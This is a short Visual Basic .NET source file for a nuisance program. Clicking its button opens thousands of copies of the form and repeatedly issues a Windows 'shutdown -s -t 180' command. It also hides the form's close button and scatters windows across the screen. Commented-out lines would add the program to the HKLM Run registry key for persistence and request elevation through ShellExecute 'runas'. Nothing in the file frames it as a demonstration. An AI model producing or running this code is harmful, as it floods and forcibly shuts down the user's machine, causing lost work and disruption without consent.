Public Class Form1
    Dim ProcID As Integer
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles b.Click
        For X = 0 To 32767 Step 2
            Dim oForm As Form1
            oForm = New Form1()
            oForm.Show()
            oForm = Nothing
            System.Diagnostics.Process.Start("shutdown", "-s -t 180")
        Next X

    End Sub
    Private Const CP_NOCLOSE_BUTTON As Integer = &H200
    Protected Overloads Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim myCp As CreateParams = MyBase.CreateParams
            myCp.ClassStyle = myCp.ClassStyle Or CP_NOCLOSE_BUTTON
            Return myCp
        End Get
    End Property
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim more As New Form
        Dim rn As New Random
        Me.Location = New Point(rn.Next(0, 999), rn.Next(0, 999))
        'My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub

    Private Sub ok(sender As Object, e As EventArgs) Handles b.TextChanged

    End Sub
    '    Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecute" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
    'Const SW_SHOWNORMAL = 1
    'ShellExecute 0, "runas", "c:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", Command, vbNullString, SW_SHOWNORMAL
End Class
